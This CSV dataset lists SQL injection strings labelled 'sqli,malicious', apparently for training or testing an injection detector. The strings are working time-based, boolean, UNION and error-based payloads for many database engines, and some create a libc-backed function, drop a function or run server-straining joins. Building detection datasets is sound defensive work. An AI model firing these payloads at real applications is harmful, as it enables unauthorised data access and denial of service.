payload,type,label
"1%'));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,malicious
"1""))) and make_set(8403=8403,8899) and (((""uisi""=""uisi",sqli,malicious
1;select pg_sleep(5)# pjvi,sqli,malicious
"1)) as xutu where 5811=5811 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,malicious
(select (case when (3348=1710) then 3348 else cast(1 as int)/(select 0 from dual) end) from dual),sqli,malicious
"1' where 4334=4334 or elt(5873=5873,sleep(5))#",sqli,malicious
"1"") as upyn where 6185=6185 union all select null,null,null,null,null,null,null,null,null,null--",sqli,malicious
"1"") as kbjt where 2012=2012 and (5978=6898)*6898--",sqli,malicious
"1') where 3331=3331 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,malicious
"1')) as fwhv where 3921=3921 union all select null,null--",sqli,malicious
"-7422"" union all select 9127,9127,9127,9127,9127,9127,9127,9127,9127,9127#",sqli,malicious
1)) as iihk where 5414=5414 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,malicious
"-5148"")) or 5310=8229",sqli,malicious
"1)) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,malicious
"1)) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((5507=5507",sqli,malicious
"1%"" and make_set(8403=8403,8899) and ""%""=""",sqli,malicious
1' in boolean mode) rlike sleep(5)#,sqli,malicious
"1"";select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",sqli,malicious
1) as fxfe where 1148=1148 or (select * from (select(sleep(5)))sddo)#,sqli,malicious
"1%')));iif(4638=8258,1,1/0)",sqli,malicious
"-5706"")) union all select 2013,2013,2013,2013#",sqli,malicious
"1') as ohcs where 9588=9588 or elt(6272=6272,sleep(5))--",sqli,malicious
-7903 where 6699=6699 or 8571=8571--,sqli,malicious
1' and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'ukzb'='ukzb,sqli,malicious
"1"" and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')",sqli,malicious
"1'||(select 'fcws' from dual where 9184=9184 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161))||'",sqli,malicious
1' rlike sleep(5),sqli,malicious
"-1710"")) as cvky where 1858=1858 union all select 1858,1858--",sqli,malicious
-2174')) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (('dyyg'='dyyg,sqli,malicious
"-4550"") as hlwe where 6026=6026 or (9364=9593)*9593--",sqli,malicious
1'||(select 'xmoq' from dual where 8047=8047 and 7533=7533)||',sqli,malicious
1%' and 6454=8348 and '%'=',sqli,malicious
1) rlike (select (case when (5477=7492) then 1 else 0x28 end)) and (4427=4427,sqli,malicious
"1%')) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('%'='",sqli,malicious
"1"" and 4595=4595#",sqli,malicious
1) as qkkm where 8461=8461;select (case when (9030=9185) then 9030 else 9030*(select 9030 from information_schema.character_sets) end)#,sqli,malicious
"1"")) union all select null#",sqli,malicious
"-7553%"" or 3571=2886",sqli,malicious
1) where 4548=4548 and 9198=9198--,sqli,malicious
"1') or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))",sqli,malicious
"1) and 8407=(select count(*) from generate_series(1,5000000)) and (2160=2160",sqli,malicious
"elt(2427=2427,5518)",sqli,malicious
"1%"")) rlike (select (case when (4207=1757) then 1 else 0x28 end)) and ((""%""=""",sqli,malicious
"1')) as uncy where 8009=8009 union all select null,null,null,null,null,null,null,null,null#",sqli,malicious
"-9007) as gill where 6462=6462 union all select 6462,6462,6462,6462,6462,6462,6462,6462,6462#",sqli,malicious
"1';select * from generate_series(4465,4465,case when (4465=6232) then 1 else 0 end) limit 1--",sqli,malicious
-4325 order by 1--,sqli,malicious
1 where 1568=1568 or (select * from (select(sleep(5)))sddo)#,sqli,malicious
1') rlike sleep(5) and ('boto'='boto,sqli,malicious
"1"")) as phis where 4420=4420 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,malicious
-2866')) or 4491=9429#,sqli,malicious
"1') where 7541=7541;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,malicious
"1);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,malicious
"1%"")) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""%""=""",sqli,malicious
"1') as fxuk where 6184=6184 and make_set(9292=2785,2785)--",sqli,malicious
"-6076"")) or 8277=4757",sqli,malicious
"-4586 union all select 2068,2068,2068,2068--",sqli,malicious
1;begin user_lock.sleep(5); end,sqli,malicious
"1 where 6500=6500;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,malicious
"-2717"" or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,malicious
"1%"" or 8466=benchmark(5000000,md5(0x694a4745)) and ""%""=""",sqli,malicious
"1%"")))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (((""%""=""",sqli,malicious
"1,(select (case when (8674=7896) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",sqli,malicious
"-8661"" union all select 5731,5731--",sqli,malicious
"1%""));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""%""=""",sqli,malicious
"1);select count(*) from generate_series(1,5000000)",sqli,malicious
"1'+(select hsef where 4136=4136 or 8421=(select count(*) from generate_series(1,5000000)))+'",sqli,malicious
1 rlike sleep(5),sqli,malicious
"1')) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (('vedm'='vedm",sqli,malicious
"1) where 6784=6784 and elt(3114=3114,sleep(5))#",sqli,malicious
"1"" and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ""kfps""=""kfps",sqli,malicious
1)) as ojjk where 3687=3687 and (4833=9218)*9218--,sqli,malicious
"1"") where 1614=1614 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",sqli,malicious
"1"" where 3018=3018 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",sqli,malicious
"-4165"" where 1772=1772 union all select 1772,1772,1772,1772,1772,1772,1772,1772--",sqli,malicious
"1"") as wsyv where 8142=8142 rlike sleep(5)#",sqli,malicious
"-7379 union all select 9813,9813,9813,9813,9813,9813,9813,9813--",sqli,malicious
"1);select benchmark(5000000,md5(0x714e4153))#",sqli,malicious
1)) rlike sleep(5) and ((8773=8773,sqli,malicious
"1"" where 9889=9889;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,malicious
1' where 1770=1770;select (case when (5569=9390) then 5569 else 1/(select 0) end)--,sqli,malicious
1)) as rbcf where 1053=1053;select (case when (3325=1767) then 3325 else 3325*(select 3325 from mysql.db) end)#,sqli,malicious
1');begin user_lock.sleep(5); end and ('rlux' like 'rlux,sqli,malicious
"1') and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('snad' like 'snad",sqli,malicious
-6586')) or 2021=2996,sqli,malicious
"1"";select pg_sleep(5)--",sqli,malicious
"1"") as yzzk where 1813=1813 and (3020=3020)*6703--",sqli,malicious
1')) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (('trzi'='trzi,sqli,malicious
"-6263%"")) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""%""=""",sqli,malicious
"1%';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,malicious
"1%"")));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,malicious
"1))) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,malicious
"1"") as eefe where 5290=5290 and (select * from (select(sleep(5)))gcrr)#",sqli,malicious
"1') where 5616=5616;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,malicious
"1) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,malicious
"1"" and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""gxhz""=""gxhz",sqli,malicious
"1' where 7445=7445 union all select null,null,null,null,null,null--",sqli,malicious
"1') where 4786=4786 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,malicious
1%' and sleep(5)#,sqli,malicious
"1') where 4407=4407 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,malicious
"1') and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ('sqni' like 'sqni",sqli,malicious
"1%"") and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""%""=""",sqli,malicious
"1')) as orvy where 7270=7270 union all select null,null,null,null,null,null,null,null#",sqli,malicious
1') where 1645=1645 rlike sleep(5)--,sqli,malicious
"-9864"") or elt(5885=4936,4936) and (""bfbb"" like ""bfbb",sqli,malicious
"1'||(select 'fbtm' where 1335=1335 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)))||'",sqli,malicious
(select * from (select(sleep(5)))lrov),sqli,malicious
1' rlike (select * from (select(sleep(5)))sgvo) and 'vnkr' like 'vnkr,sqli,malicious
1')));select sleep(5) and ((('qjsc'='qjsc,sqli,malicious
"1) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",sqli,malicious
"1') where 2284=2284 and make_set(8403=8403,8899)--",sqli,malicious
"1"";select sleep(5) and ""jvys"" like ""jvys",sqli,malicious
"1'+(select bldn where 8321=8321 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,malicious
"1));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,malicious
1)));select (case when (8331=5625) then 8331 else 8331*(select 8331 from mysql.db) end)#,sqli,malicious
"-1244) as qszw where 2332=2332 union all select 2332,2332,2332,2332#",sqli,malicious
1';if(8537=7034) select 8537 else drop function vqmp--,sqli,malicious
"-6389"" union all select 2355,2355,2355,2355,2355--",sqli,malicious
"1'))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((('jhle' like 'jhle",sqli,malicious
"1%')) union all select null,null,null,null,null#",sqli,malicious
"1'||(select 'nzjz' where 3539=3539 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,malicious
"1%"") rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (""%""=""",sqli,malicious
"1) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,malicious
"1' in boolean mode);call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)#",sqli,malicious
"1')) as hbdi where 6758=6758 and elt(1210=1210,sleep(5))--",sqli,malicious
"1"")) union all select null,null#",sqli,malicious
"1%"")) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((""%""=""",sqli,malicious
"1"" where 7879=7879;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,malicious
1 where 4641=4641;select (case when (9540=5786) then 9540 else 9540*(select 9540 from information_schema.character_sets) end)#,sqli,malicious
"-6581'||(select 'hpjd' where 7608=7608 union all select 7608,7608,7608,7608,7608,7608,7608,7608#",sqli,malicious
"-9582') where 4397=4397 union all select 4397,4397,4397#",sqli,malicious
1) and sleep(5)#,sqli,malicious
"1';select count(*) from generate_series(1,5000000)",sqli,malicious
"1"")) and elt(3785=9386,9386) and ((""inwa"" like ""inwa",sqli,malicious
"1) union all select null,null,null,null--",sqli,malicious
1'||(select 'ocmk' from dual where 3961=3961 or 6793=(select 6793 from pg_sleep(5)))||',sqli,malicious
"-4960 union all select 4031,4031#",sqli,malicious
"1%'))) or 8421=(select count(*) from generate_series(1,5000000)) and ((('%'='",sqli,malicious
1') and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),sqli,malicious
"1') or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,malicious
"1"") as rcnk where 1800=1800;select sleep(5)--",sqli,malicious
"-5587%') or elt(1032=1032,3623) and ('%'='",sqli,malicious
1')) and 6690=3250#,sqli,malicious
1%'));begin dbms_lock.sleep(5); end--,sqli,malicious
1);select case when 7951=1147 then 1 else null end--,sqli,malicious
"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",sqli,malicious
"1) as nxmd where 8650=8650;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,malicious
"1' or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,malicious
-3378')) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('otbq'='otbq,sqli,malicious
"1' (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)",sqli,malicious
"1) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,malicious
"-8929' union all select 5324,5324,5324,5324,5324,5324--",sqli,malicious
"1%"") or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,malicious
"1"")) and 3824=benchmark(5000000,md5(0x76555642)) and ((""fbol"" like ""fbol",sqli,malicious
"-2726"")) or elt(1032=1032,3623) and ((""ococ""=""ococ",sqli,malicious
-4239 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))-- xacp,sqli,malicious
1' in boolean mode);select (case when (8711=6432) then 1 else 8711*(select 8711 from master..sysdatabases) end)--,sqli,malicious
"1')) or elt(6272=6272,sleep(5)) and (('fele'='fele",sqli,malicious
"1'+(select kpso where 1226=1226 union all select null,null,null,null,null,null,null,null--",sqli,malicious
1'||(select 'ypqa' where 1961=1961 or 6793=(select 6793 from pg_sleep(5)))||',sqli,malicious
"-8349) union all select 8126,8126#",sqli,malicious
"1');call regexp_substring(repeat(right(char(3702),0),500000000),null) and ('cixa' like 'cixa",sqli,malicious
"1' in boolean mode) and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,malicious
"1')) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,malicious
"-9779')) or make_set(9354=9354,7185) and (('hmzj'='hmzj",sqli,malicious
"1%"" or elt(6272=6272,sleep(5)) and ""%""=""",sqli,malicious
"1%"") and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""%""=""",sqli,malicious
"-4381 or make_set(6118=3095,3095)# lkcr",sqli,malicious
